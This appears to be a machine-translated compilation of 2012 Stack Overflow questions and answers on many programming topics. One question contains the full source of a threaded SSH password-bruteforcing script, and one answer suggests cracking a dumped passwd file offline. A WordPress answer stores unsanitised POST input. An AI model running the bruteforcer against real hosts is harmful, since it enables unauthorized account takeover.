int printAnsi( FILE *outstream, char *string) {
    /* loop over the chars in string and print them to the outputstream as ansi */
    char * ps = string;
    while (*ps != '\0') {
        fprintf(outstream, "%c", *ps);
        ps++;
    }
    return 0;
} 
```

所有这一切的最终结果是我有一个到内存空间的流，就像`open_memstream()`还有一个 char 指针，我可以在必要时使用它来遍历内存空间。它是跨平台的，并且（看似）功能齐全。

如果有人想要更多详细信息或对我应该解决的问题有注释，请添加评论。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T20:04:16.680

不`malloc()`，只是给你一块（可能是未初始化的）内存。没有“神奇”的演员阵容；当你这样做时，`int * buf = malloc(10*sizeof(int);`你实际上是在指向`buf`10 个未初始化的整数。

与 FILE 相对应的东西将`FILE * f = malloc(10*sizeof(FILE));`指向`f`10 个未初始化的 FILE 结构，这没有任何意义。此外，如果*幸运*的话，写入未初始化的 FILE 可能会导致崩溃。

如果您告诉我们您的目标平台以及您实际想要实现的目标，那么提供帮助会更容易。在 POSIX 上，您可以使用`shm_open()`获取指向“共享内存”`fdopen()`的文件描述符并将文件描述符转换为`FILE*`. 是的，它可能会用完空间。

# ruby-on-rails - 如何定义用于动态列的数据类型？

> ID：10305102
> 
> 赞同：1
> 
> 时间：2012-04-24T19:55:47.407
> 
> 标签：ruby-on-rails, ruby-on-rails-3.1

对于普通的数据库列，Rails 会根据列类型自动选择匹配的 Ruby 数据类型，即//`decimal`列最终成为`integer`//属性。`varchar``BigDecimal``Fixnum``String`

但是如果我使用计算列查询数据库

```
Model.select(['models.*', 'calculated_int_column']).other_arel_stuff 
```

该属性`calculated_int_column`始终包含一个`String`对象，即使我`integer`在 select 语句中使用了显式强制转换。

我猜这是因为 Rails 使用模式来查找列类型。

**我如何告诉 Rails 使用哪种 Ruby 类型来写这个专栏？**

先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T20:02:09.170

不确定这是否是您想要的答案，但您可以覆盖 getter 方法以返回一个整数：

```
class Model
  def calculated_int_column
    @calculated_int_column = 0 if @calculated_int_column.nil?
    @calculated_int_column.to_i
  end
end 
```

# iphone - 修剪字符串后的空格

> ID：10305107
> 
> 赞同：-1
> 
> 时间：2012-04-24T19:56:15.783
> 
> 标签：iphone, objective-c, xcode

从 SQLite 获取数据后，在此示例中，我有城市和州。分别是“圣何塞”和“CA”。我们称它们为 NSString *city 和 *state。

当我把它们贴在这样的标签上时......

```
Label1.text = [NSString stringWithFormat:@"%@, %@",city,state]; 
```

在数据库中的所有空格之前，我得到...“San Jose , CA”。我怎样才能摆脱这些空间。我只熟悉 NSMakeRange 并且只知道如何将其修剪到一定长度。提前感谢您的帮助。编辑器并没有真正显示所有空格，但它在 san jose 之后有 10 个空格。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T19:58:01.663

```
[city stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]]; 
```

你可以对 state ofcourse 做同样的事情。

# php - 删除按钮布局

> ID：10305109
> 
> 赞同：0
> 
> 时间：2012-04-24T19:56:25.737
> 
> 标签：php

我已经完成了处理复选框的解决方案，并认为我了解我需要做什么，但是我有一个问题，我将删除按钮放在这段代码中。这是我的桌子：

```
<table>
    <thead>
    <tr>
        <th>Camera Name</th>
        <th>Date Created</th>
        <th>Video Size</th>
        <th>Video Length</th>
        <th>
            <button type="submit" class="deletebutton" name="delete_video" value="Delete" title="Delete the selected videos" onClick="return confirm('Are you sure you want to delete?')">Delete</button><br>
            <input type="checkbox" name="radioselectall" title="Select All" />
        </th>
    </tr>
    </thead>
    <tbody>

 <?php

for($i=0;$i<$num_videos;$i++)
{
       //do stuff
       //Note: I'm looping here to build the table from the server
?>              
        <tr >
            <td onclick="DoNav('<?php echo $url; ?>');">
                        <?php echo $result_videos[$i]["camera_name"]; ?> 
            </td>
            <td onclick="DoNav('<?php echo $url; ?>');">
                        <?php echo setlocalTime($result_videos[$i]["video_datetime"]); ?> 
            </td>
            <td onclick="DoNav('<?php echo $url; ?>');">
                        <?php echo ByteSize($result_videos[$i]["video_size"]); ?>
            </td>
            <td onclick="DoNav('<?php echo $url; ?>');">
                <?php echo strTime($result_videos[$i]["video_length"]); ?>
            </td>
            <td>
                <form name="myform" action="<?php echo htmlentities($_SERVER['REQUEST_URI']); ?>" method="POST">
                <input type="checkbox" name="radioselect" title="Mark this video for deletion"/>
                <input type="hidden" name="video_name" value="<?php echo $result_videos[$i]["video_name"]; ?>" />
                </form>
            </td>
        </tr>
... 
```

请注意，我循环并从服务器填充表，但标题显然没有循环通过。我曾经将删除按钮放在表格中和表格的每一行上。但是现在因为我想要多次删除，所以我在每一行上创建复选框并将删除按钮放在标题中。我还应该注意这`video_name`很重要，所以我知道要删除哪些视频。

但这就是问题所在，因为我在表单中没有提交（删除）（即在循环中），所以我无法处理这些复选框。相反，我只有删除按钮 谁能建议一个更好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:00:12.667

一种解决方案是将视频的 ID 放在其删除复选框的名称中。然后，您可以阅读收到的复选框并从中解析出视频名称。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:01:05.133

表单应该围绕整个表格，而不是隐藏输入的名称，您可以在复选框的名称中使用它：

```
<input type="checkbox" name="radioselect[<?php echo $result_videos[$i]['video_name']; ?>]" /> 
```

然后，在接收 POST 请求的 PHP 脚本中，`$_POST['radioselect']`将是一个数组。然后你可以使用：

```
foreach(array_keys($_POST['radioselect']) as $k) { ... } 
```

这将遍历选定的复选框。你进去了`video_name`，`$k`你可以像处理一次删除一样处理它。

# python - 在 scipy 中修剪树状图（分层聚类）

> ID：10305111
> 
> 赞同：13
> 
> 时间：2012-04-24T19:56:33.757
> 
> 标签：python, hierarchical-clustering

我有一个包含大约 5000 个条目的距离矩阵，并使用 scipy 的层次聚类方法对矩阵进行聚类。我用于此的代码是以下代码段：

```
Y = fastcluster.linkage(D, method='centroid') # D-distance matrix
Z1 = sch.dendrogram(Y,truncate_mode='level', p=7,show_contracted=True) 
```

由于所有这些数据的树状图会变得相当密集，因此我使用 truncate_mode 对其进行修剪。所有这些都有效，但我想知道如何找出原始 5000 个条目中哪些属于树状图中的特定分支。

我尝试使用

```
 leaves = sch.leaves_list(Y) 
```

获取叶子列表，但这使用链接输出作为数据，虽然我可以看到修剪后的树状图和叶子列表之间的对应关系，但手动将原始条目映射到树状图变得有点麻烦。

总结一下：有没有办法列出距离矩阵中属于修剪树状图中分支的所有原始条目？或者还有其他我不知道的方法。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T17:09:13.810

scipy.cluster.hierarchy.dendrogram 返回的字典数据结构之一具有 key `ivl`，[文档](http://docs.scipy.org/doc/scipy/reference/generated/scipy.cluster.hierarchy.dendrogram.html)描述为：

> 与叶节点对应的标签列表

您可以提供自定义标签（使用`labels=<array of lables>`）作为 dendrogram 函数的输入，但默认情况下，它们只是原始观察的索引。通过比较原始标签/索引 和 `Z1['ivl']`，您可以确定原始条目是什么。

# asp.net - NHibernate 配置 - 移动到 web.config 文件

> ID：10305114
> 
> 赞同：1
> 
> 时间：2012-04-24T19:56:48.830
> 
> 标签：asp.net, nhibernate, configuration-files

我在设置 NHibernate 配置时遇到问题。如果我创建一个单独的配置文件，我可以让它工作，然后当我调用 Configuration.configure 我指向配置文件的绝对路径（“C：\我的文档......等等......）。这显然会当我尝试从开发转向生产时会出现问题。所以我想我会将配置移动到 web.config 文件，但它失败了。所以，在 web.config 文件中我有：

```
<configSections>
<section name="hibernate-configuration"
  type="NHibernate.Cfg.ConfigurationSectionHandler, NHibernate" />
</configSections>

<hibernate-configuration xmlns="urn:nhibernate-configuration-2.2">
<session-factory>
  <property name="dialect">NHibernate.Dialect.MsSql2005Dialect</property>
  <property name="connection.connection_string">Data Source=MyServerName;Initial Catalog=MyDatabase;Integrated Security=True</property>
  <property name="connection.isolation">ReadCommitted</property>
  <property name="proxyfactory.factory_class">NHibernate.ByteCode.LinFu.ProxyFactoryFactory, NHibernate.ByteCode.LinFu</property>
  <property name="current_session_context_class">web</property>
</session-factory>
</hibernate-configuration> 
```

然后我像这样测试：

```
<TestFixture()> _
Public Class GenerateSchema_Fixture

    <Test()> _
    Public Sub Can_generate_schema()

        Dim cfg = New NHibernate.Cfg.Configuration()
        cfg.Configure() 
        cfg.AddAssembly(GetType(Question).Assembly)
        Dim exp As NHibernate.Tool.hbm2ddl.SchemaExport = New NHibernate.Tool.hbm2ddl.SchemaExport(cfg)
        exp.Execute(False, True, False)

    End Sub

End Class 
```

当我运行这个测试时，我得到：

```
------ Test started: Assembly: ECEHire.Test.dll ------

Test 'ECEHire.Test.Tests.GenerateSchema_Fixture.Can_generate_schema' failed: NHibernate.HibernateException : Format of the initialization string does not conform to specification starting at index 49. 
```

----> System.ArgumentException : 初始化字符串的格式不符合从索引 49 开始的规范。在 NHibernate.Tool.hbm2ddl.SchemaExport.Execute(Action `1 scriptAction, Boolean export, Boolean justDrop) at NHibernate.Tool.hbm2ddl.SchemaExport.Execute(Boolean script, Boolean export, Boolean justDrop) GenerateSchema_Fixture.vb(19,0): at ECEHire.Test.Tests.GenerateSchema_Fixture.Can_generate_schema() --ArgumentException at System.Data.Common.DbConnectionOptions.GetKeyValuePair(String connectionString, Int32 currentPosition, StringBuilder buffer, Boolean useOdbcRules, String& keyname, String& keyvalue) at System.Data.Common.DbConnectionOptions.ParseInternal(Hashtable parsetable, String connectionString, Boolean buildChain, Hashtable synonyms, Boolean firstKey) at System.Data.Common.DbConnectionOptions..ctor(String connectionString, Hashtable synonyms, Boolean useOdbcRules) at System.Data.SqlClient.SqlConnectionString..ctor(String connectionString) at System.Data.SqlClient.SqlConnectionFactory.CreateConnectionOptions(String connectionString, DbConnectionOptions previous) at System.Data.ProviderBase.DbConnectionFactory.GetConnectionPoolGroup(String connectionString, DbConnectionPoolGroupOptions poolOptions, DbConnectionOptions& userConnectionOptions) at System.Data.SqlClient.SqlConnection.ConnectionString_Set(String value) at System.Data.SqlClient.SqlConnection.set_ConnectionString(String value) at NHibernate.Connection.DriverConnectionProvider.GetConnection() at NHibernate.Tool.hbm2ddl.SchemaExport.Execute(Action`1 scriptAction, Boolean export, Boolean justDrop)

```
0 passed, 1 failed, 0 skipped, took 3.30 seconds (NUnit 2.5.10). 
```

我正在考虑的方向是：web.config 文件在我的主项目中，而不是在测试项目中。这是否意味着我必须为 NHibernate 使用单独的配置文件。如果是这样，我仍然有同样的问题（我仍然得到同样的错误）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T20:56:42.073

是的，每个环境都应该有不同的配置文件：testing 和 web.xml。在测试配置中 current_session_context_class 不应该是 web（而是尝试使用 ThreadStaticSessionContext）。

# wordpress - WordPress - 向 wp_posts 添加额外的列，并发布到它

> ID：10305116
> 
> 赞同：2
> 
> 时间：2012-04-24T19:56:55.423
> 
> 标签：wordpress, field

我正在尝试在“添加帖子”或“添加页面”中添加一个额外的字段，在其中将该字段的值插入到数据库中 wp_posts 表中添加的手动添加的列中。

我知道我可以使用自定义字段模板，但问题是这些自定义字段将值插入 wp_postmeta 而不是 wp_post，我需要同一张表中的单个帖子的所有内容。

知道怎么做吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-25T15:26:44.757

如果您已经手动将该字段添加到 wp_posts 表中，那么您只需要使用一些挂钩将该字段添加到帖子页面然后保存它。

```
// Function to register the meta box
function add_meta_boxes_callback( $post_type, $post ) {
    add_meta_box( 'my_field', 'My Field', 'output_my_meta_box', 'post' );
}
add_action( 'add_meta_boxes', 'add_meta_boxes_callback', 10, 2 );

// Function to actually output the meta box
function output_my_meta_box( $post ) {
    echo '<input type="text" name="my_field" value="' . $post->my_field . '" />';
}

// Function to save the field to the DB
function wp_insert_post_data_filter( $data, $postarr ) {
    $data['my_field'] = $_POST['my_field'];
    return $data;
}
add_filter( 'wp_insert_post_data', 'wp_insert_post_data_filter', 10, 2 ); 
```

# html - TinyMCE 文本编辑器和默认 HTML

> ID：10305117
> 
> 赞同：0
> 
> 时间：2012-04-24T19:57:02.117
> 
> 标签：html, tinymce

我刚刚开始使用 TinyMCE 文本编辑器，我有点困惑。我搜索了我的问题，但我没有找到任何答案，所以我会问你。是否可以将默认 HTML 元素设置为无法删除的 TinyMCE 编辑器。我的意思是说：

```
<textarea id="tinyMCE">
    <div id="impossible-to-delete-default-html">

             Put some changeable HTML like <p>, <a>, <span> etc ...

    </div>
</textarea> 
```

更重要的是，当我想在我的文本中插入图像时，我应该先从其他地方上传它们然后使用它们，还是有插件可以让我直接上传它们？提前致谢。:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:01:04.317

1：我通常在页面本身中设置默认 html 并在其之间或之后加载 TINYY 文本，然后我确定用户不会做错任何事。

2：Tiny 可以选择直接在你的编辑器中加载图片

# c# - 线程评分系统

> ID：10305121
> 
> 赞同：0
> 
> 时间：2012-04-24T19:57:32.387
> 
> 标签：c#, multithreading, windows-phone-7

我开始学习线程并且遇到了问题。

我有一个计分系统，旨在将一个点添加到一个临时的 addedPoints 变量中，以向玩家显示他们最近获得了多少分。然后在大约 1 秒后，添加的分数应该被添加到玩家的分数中。

我的尝试如下所示：

```
public static void AddPoints(int points)
{
    for (int i = 0; i < points; i++)
    {
        Thread addThread = new Thread(new ThreadStart(ThreadedPoint));
    }
}

private static void ThreadedPoint()
{
    addedPoints += 1;
    Thread.Sleep(1000);
    score += 1;
    addedPoints -= 1;
} 
```

这有两个问题。首先，它只允许我为每个线程添加 1 个点，这远非理想。其次，它实际上不起作用。addedPoints 和 score 都不会更新。我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-24T20:00:34.257

你实际上还没有开始你的线程，所以什么都不会发生：

```
public static void AddPoints(int points)
{
    for (int i = 0; i < points; i++)
    {
        Thread addThread = new Thread(new ThreadStart(ThreadedPoint));
        addThread.Start();
    }
} 
```

就一次添加多个点而不是一次添加一个点而言，您可以使用[ParameterizedThreadStart](http://msdn.microsoft.com/en-us/library/system.threading.parameterizedthreadstart.aspx)代替：

```
public static void AddPoints(int points)
{
   Thread addThread = new Thread(new ParameterizedThreadStart(ThreadedPoint));
   addThread.Start(points); //You may need a cast of points to Object here
}

private static void ThreadedPoint(Object data)
{
    int points = (int)data;
    addedPoints += points;
    Thread.Sleep(1000);
    score += points;
    addedPoints -= points;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T20:21:42.637

除非您想学习线程，否则最好以不需要延迟更新的方式重新设计商店“最近赚取”的方式。

即立即更新分数并有单独的文件说明获得最新积分的时间，因此您始终可以获得分数并通过一些代码找出“最近获得”信息。如果需要，您可以通过“最近获得”调整分数的显示值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:05:34.523

如果您想慢慢消耗积分，请将积分传递给线程（请参阅[如何将参数传递给 Java 线程？](https://stackoverflow.com/questions/877096/how-can-i-pass-a-parameter-to-a-java-thread)）并使用 while 循环消耗所有积分（假设您将传递的参数存储为积分） .

```
while(points > 0) {
  points -=1;
  addedPoints += 1;
  Thread.Sleep(1000);
  score += 1;
  addedPoints -= 1;
} 
```

# objective-c - 触摸结束不会调用方法

> ID：10305122
> 
> 赞同：0
> 
> 时间：2012-04-24T19:57:44.527
> 
> 标签：objective-c, ios, cocos2d-iphone, nsdictionary

我已经为 cocos2D 中的 CCLayer 实现了触摸结束。当收到触摸时，它会调用一个方法。但是，调用该方法似乎总是导致应用程序由于“EXC_BAD_ACCESS”而崩溃在我调用的方法中，我尝试从 NSMutableDictionary 中读取这是我的代码：

```
- (void)ccTouchEnded:(UITouch *)touch withEvent:(UIEvent *)event
{
    CGPoint touchPoint = [touch locationInView:[touch view]];
    touchPoint = [[CCDirector sharedDirector] convertToGL:touchPoint];
    int current = 1;
    int i = 1;
    for (i=1; i<=4; i++) {
        CCNode *sprite = [layer2 getChildByTag:i];
        CGPoint worldCoord = [layer2 convertToWorldSpace:sprite.position];
        CGRect bounds = CGRectMake(worldCoord.x-sprite.boundingBox.size.width, worldCoord.y-sprite.boundingBox.size.height/2, sprite.boundingBox.size.width, sprite.boundingBox.size.height);
        //CCLOG(@"Sprite%i:%f,%f at %f,%f",i,bounds.size.width,bounds.size.height,bounds.origin.x,bounds.origin.y);
        if (CGRectContainsPoint(bounds, touchPoint)) {
            CCLOG(@"touched sprite:%i",i);
            current = i;
            [self checkSpriteTouch:current]; //error occurs when this method is called

            break;
        }
    }
}
-(void)registerWithTouchDispatcher{
    [[CCTouchDispatcher sharedDispatcher] addTargetedDelegate:self priority:1 swallowsTouches:NO];
}

-(void)checkSpriteTouch:(int)i{
    NSMutableDictionary *dict = [storeDict objectForKey:[NSString stringWithFormat:@"Char%i",1]]; //when using debugging, app crashes here at this line
    NSNumber *boughtValue = [dict objectForKey:@"Bought"];
} 
```

为什么我的应用程序崩溃？我在其他 touchEnded 方法中实现的所有其他方法都可以正常工作......提前谢谢您！非常感谢任何帮助^_^

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T04:06:43.617

storeDict 是空的还是零？

我也认为应该是 i 而不是 1

```
NSMutableDictionary *dict = [storeDict objectForKey:[NSString stringWithFormat:@"Char%i",i]]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-28T17:18:01.920

所以`(int)i`什么也没做`checkSpriteTouch`，我不知道为什么你必须把 i 放在你的方法中。

此外，您应该检查`storeDict`崩溃时“i”值的实现。也许您必须在此处输入代码，以便我们检查。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-30T19:57:51.437

我终于弄清楚了为什么访问该方法会导致我的应用程序崩溃。答案是访问字典。我没有正确保留它，从而导致错误的访问警告。为了解决这个问题，我在头文件中使用了：@property(nonatomic,retain)NSMutableDictionary *storeDict; 现在，一切正常！^_^

# jquery - 复杂的 jQuery 帖子

> ID：10305123
> 
> 赞同：0
> 
> 时间：2012-04-24T19:57:44.723
> 
> 标签：jquery, html

我有一个包含 n 个 div 的表单，每个 div 包含单独的输入。这些 div 存在于相同的类名“c1”下，但不包含任何其他属性。每个 c1 包含具有唯一类名的相同输入。每个 div 将始终包含相同样式的输入。这方面的一个例子是：

```
<div class="c1">
    <input class="in1" type="text"/>
    <input class="in2" type="text"/>
</div>
<div class="c1">
    <input class="in1" type="text"/>
    <input class="in2" type="text"/>
</div>
<div class="c1">
    <input class="in1" type="text"/>
    <input class="in2" type="text"/>
</div> 
```

信息应该通过使用 jQuery 的 $.post(...) 的帖子发送。我不使用 id 系统让用户能够修改内容，即添加和删除 c1 div。我不知道如何将收集到的信息发布到一个 php 页面以获取 n 数量的项目，也不知道如何根据 div 将信息保存在一起。有什么建议吗？

我一直在考虑使用序列化，但我不确定如何根据封装的 div 保持信息的唯一性。`map`另一种方法是使用命令迭代每个 div 为帖子的“数据”参数进行自定义`.each`，但有些东西告诉我我走错了路。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:24:38.710

你可以做这样的事情来自动生成命名参数：

```
 var postData = {};
    $(".c1").each(function() {
        var name = "input" + $(this).index();

        postData[name + "in1"] = $(this).find(".in1").val();
        postData[name + "in2"] = $(this).find(".in2").val()       
    })

    console.log(postData); 
```

然后只需通过 AJAX 提交 postData

​</p>

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:04:51.640

如果您动态生成它，您可以为每个输入设置一个唯一的 id。如inp1、inp2等。然后您可以根据这些唯一 ID 创建您的地图。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:42:51.680

如果您严格遵守您的 HTML 代码，那么您无法自动执行任何操作，例如使用`.serialize()`jQuery 中的方法，因为它至少`name`需要使用 。

手动执行此操作，您可以创建数据，然后将其发布如下：

```
$("#btnSave").click(function() {

var dt = {},
    div = 0,
    arr = 0;

$(".c1").each(function() {
  // for each <div class="c1">
  $(this).find("input").each(function() {
    // for each <input> inside the <div>

    dt['p' + arr++] = 'd' + div + 
            '_c_' + $(this).attr("class") + 
            '_v_' + $(this).val();
  });
  div++;
});

// now, we post the data    
$.post("http://bing.com/", dt, function(data) {
  // do something...
});

return false; // dont post automatically

}); 
```

然后你有类似的东西：

```
p0  _d_0_c_in1_v_1
p1  _d_0_c_in2_v_4
p2  _d_1_c_in1_v_2
p3  _d_1_c_in2_v_5
p4  _d_2_c_in1_v_3
p5  _d_2_c_in2_v_6 
```

并且`d2_c_in2_v_6`您可以将字符串拆分为：

*   `_d_`对于 div
*   `_c_`对于类名
*   `_v_`对于输入值

[JsBin 中的实例](http://jsbin.com/oqelog/)

# javascript - 将表单数据合并到 URL

> ID：10305126
> 
> 赞同：0
> 
> 时间：2012-04-24T19:57:49.777
> 
> 标签：javascript, forms

我想制作一个带有用户输入内容的文本字段的表单，然后需要将其合并到指向用户将被重定向到的外部站点的链接中。

所以假设用户输入'foobar'。在他点击提交后，他应该被带到[http://example.com/foobar](http://example.com/foobar)。

这最好是在 JS 中，尽管 PHP 也可以。

到目前为止，我有这个：

```
<html>
<head>
<script type="text/javascript">

function genURL() {
var user = document.getElementById('user');
window.location.href = "http://example.com/" + user;
}

</script>
</head>
<body>

<form>
username: <input type="text" name="user">
<input type="submit" value="Submit" name="user" onClick="genURL()">
</form>

</body>
</html> 
```

唯一要做的就是将 ?user=foobar 附加到 URL。

我需要做什么才能完成这项工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:05:20.820

您应该阻止提交表单。您可以通过使您的函数`onsubmit`成为表单的处理程序并返回`false`以防止表单被提交来做到这一点。

此外，您应该使用`.value`in获取该字段的内容`document.getElementById('').value`。

**JavaScript：**

```
function genURL() {
    var user = document.getElementById("user").value;
    window.location = "http://google.com/" + user;
}​ 
```

**HTML：**

```
<form onsubmit="genURL(); return false;">
    <input type="text" id="user" />
    <input type="submit" value="Submit" />
</form>​ 
```

**演示：http:** [//jsfiddle.net/jhogervorst/CFHtG/](http://jsfiddle.net/jhogervorst/CFHtG/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:01:36.480

您想要用户元素的值。

```
var user = document.getElementById('user').value; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:02:18.143

请尝试以下方法：

```
function genURL() {
    var user = document.getElementById('user');
    window.location.href = "http://thisisnotarealurl.com/" + user.value;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-24T20:03:21.183

将表单的操作设置为要调用的 URL 并将表单的方法设置为 GET 不是更容易吗？

然后你会有：

```
<html>
    <body>
        <form action="http://example.com" method="GET">
            username: <input type="text" name="user">
            <input type="submit" value="Submit" name="user">
        </form>
    </body>
</html> 
```

不需要 JavaScript :)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-24T20:05:24.370

```
function genURL() {
    var user = document.getElementById('user');
    window.location.href = document.URL + user.value;
} 
```

# python - 具有多个循环和线程的 Python 问题

> ID：10305130
> 
> 赞同：1
> 
> 时间：2012-04-24T19:58:06.423
> 
> 标签：python, multithreading, python-3.x, python-2.7

我不是 python 程序员，但我得到了一段运行良好的代码，但我需要修改它以循环文件并获取一些数据并执行相同的任务。显然它工作正常，但在第一行的末尾获得它崩溃是这样的：

```
python x.py -H SSH-Hosts.txt -U Users.txt -P passlist.txt

*************************************
*SSH Bruteforcer Ver. 0.2           *
*Coded by Christian Martorella      *
*Edge-Security Research             *
*laramies@gmail.com                 *
*************************************

Username file: Users.txt
Password file: passlist.txt
*************************************

HOST: 192.168.1.3
Username: bob
Trying password...
zzzzzz

Username: john
Trying password...

Traceback (most recent call last):
  File "x.py", line 146, in <module>
    test(sys.argv[1:])
  File "x.py", line 139, in test
    test_thread(name)
  File "x.py", line 81, in test_thread
    thread.join()
Zxcvbnm 
```

该应用程序是一个测试弱 SSH 帐户的小工具，我们最近成为了几次暴力攻击的目标，我们阻止了所有这些攻击，但我们也希望定期测试弱帐户，因为可用的应用程序（例如美杜莎）崩溃了，我决定修改这个在我们的系统上运行良好的系统，但是通过每个主机和每个用户的用户对我们来说不是很现实。这不是未经授权的测试，我是 IT 的成员，我们这样做是为了防止违规！

```
import thread
import time
from threading import Thread
import sys, os, threading, time, traceback, getopt
import paramiko
import terminal

global adx
global port

adx="1"
port=22
data=[]
i=[]

term = terminal.TerminalController()
paramiko.util.log_to_file('demo.log')

print "\n*************************************"
print "*"+term.RED + "SSH Bruteforcer Ver. 0.2"+term.NORMAL+"           *"
print "*Coded by Christian Martorella      *"
print "*Edge-Security Research             *"
print "*laramies@gmail.com                 *"
print "*************************************\n"

def usage():
    print "Usage: brutessh.py options \n"
    print "       -H: file with hosts\n"
    print "       -U: file with usernames\n"
    print "       -P: password file \n"
    print "       -p: port (default 22) \n"
    print "       -t: threads (default 12, more could be bad)\n\n"
    print "Example:  brutessh.py -h 192.168.1.55 -u root -d mypasswordlist.txt \n"
    sys.exit()

class force(Thread):
    def __init__( self, name ):
        Thread.__init__(self)
        self.name = name

    def run(self):
        global adx
        if adx == "1":
            passw=self.name.split("\n")[0]
            t = paramiko.Transport(hostname)
            try:
                t.start_client()
            except Exception:
                x = 0

            try:
                t.auth_password(username=username,password=passw)
            except Exception:
                x = 0

            if t.is_authenticated():
                print term.DOWN + term.GREEN + "\nAuth OK ---> Password Found: " + passw + term.DOWN + term.NORMAL
                t.close()
                adx = "0"
            else:
                print term.BOL + term.UP + term.CLEAR_EOL + passw + term.NORMAL
                t.close()
        time.sleep(0)
        i[0]=i[0]-1

def test_thread(names):
    i.append(0)
    j=0
    while len(names):
        try:
            if i[0]<th:
                n = names.pop(0)
                i[0]=i[0]+1
                thread=force(n)
                thread.start()
                j=j+1
        except KeyboardInterrupt:
            print "Attack suspended by user..\n"
            sys.exit()
    thread.join()

def test(argv):
    global th
    global hostname
    global username
    th = 12
    if len(sys.argv) < 3:
        usage()
    try :
        opts, args = getopt.getopt(argv,"H:U:P:p:t:")
    except getopt.GetoptError:
        usage()
    for opt,arg in opts :
        if opt == '-U':
            username = arg
        elif opt == '-H':
            hostname =arg
        elif opt == '-P':
            password = arg
        elif opt == '-p':
            port = arg
        elif opt == "-t":
            th = arg

    try:
        h = open(hostname, 'r')
    except:
        print "Can't open file with hostnames\n"
        sys.exit()

    try:
        u = open(username, "r")
    except:
        print "Can't open username file\n"
        sys.exit()

    try:
        f = open(password, "r")
    except:
        print "Can't open password file\n"
        sys.exit()

    print term.RED + "Username file: " +term.NORMAL + username +  "\n" +term.RED + "Password file: " +term.NORMAL+ password
    print "*************************************\n\n"

    hostfile = h.readlines()
    for hostname in hostfile:

        print "HOST: " + hostname.rstrip('\n')
        userfile = u.readlines()
        for username in userfile:

            print "Username: " + username.rstrip('\n')

            print "Trying password...\n"
            name = f.readlines()
            #starttime = time.clock()
            test_thread(name)
            #stoptime = time.clock()
            #print "\nTimes -- > Init: "+ str(starttime) + " End: "+str(stoptime)
            print "\n"

if __name__ == "__main__":
    try:
        test(sys.argv[1:])
    except KeyboardInterrupt:
        print "Attack suspended by user...\n"
        sys.exit() 
```

如何解决这个问题？

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:23:24.057

```
import thread
...
from threading import Thread 
```

不知道为什么你决定导入两个名称几乎相同的类。看起来很危险！

我认为你需要 Thread.join() 而不是 thread.join() 因为线程有一个连接调用但线程没有。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T20:29:55.977

由于您可以访问机器，因此最好转储 passwd 文件并使用[开膛手 John](http://www.openwall.com/john/)来查找弱帐户。离线密码攻击比在线攻击要快得多。您还应该考虑运行[Fail2Ban](http://www.fail2ban.org)或类似的东西，这将通过阻止滥用 IP 来自动阻止 SSH 暴力攻击。

# windows - 在 Windows 中运行 Play Framework 2.0，得到 NoClassDefFoundError

> ID：10305131
> 
> 赞同：1
> 
> 时间：2012-04-24T19:58:15.207
> 
> 标签：windows, playframework-2.0

我正在尝试在 Windows (XP) 中运行 Play Framework 2.0，但是当我启动 play 时，我得到了这个异常：

```
>play.bat
Exception in thread "main" java.lang.NoClassDefFoundError: and
Caused by: java.lang.ClassNotFoundException: and
        at java.net.URLClassLoader$1.run(Unknown Source)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.net.URLClassLoader.findClass(Unknown Source)
        at java.lang.ClassLoader.loadClass(Unknown Source)
        at sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source)
        at java.lang.ClassLoader.loadClass(Unknown Source)
Could not find the main class: and.  Program will exit. 
```

我找不到为什么我有这个错误。当然我已经安装了 Java：

```
>java -version
java version "1.6.0_31"
Java(TM) SE Runtime Environment (build 1.6.0_31-b05)
Java HotSpot(TM) Client VM (build 20.6-b01, mixed mode, sharing) 
```

和 javac ：

```
>javac -version
javac 1.6.0_31 
```

我错过了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-02T09:44:26.533

好的，对于有同样问题的人来说，其实很简单。

我在“我的文档”中运行 Play，整个路径都包含空间。

为了玩！要工作，您必须将项目放在没有空格的文件夹中，例如：

> C:\开发\播放\2.0\

它会起作用:)

# sql - 将整数除法转换为小数的更简洁方法

> ID：10305134
> 
> 赞同：0
> 
> 时间：2012-04-24T19:58:23.067
> 
> 标签：sql, sql-server-2008, casting

我正在尝试将一些整数相除以获得百分比。默认情况下，我得到一个整数结果，当然，所以我转换为十进制。但我也希望结果在小数点右侧只有两位。

```
--select (x - y) / y

select (82 - 56) / 56                                      --0
select (82 - 56) / cast(56 as decimal(9, 2))               --0.4642857142
select cast(82 - 56 as decimal(9,2)) / 56                  --0.464285
select cast((82 - 56) / 56 as decimal(9,2))                --0.00

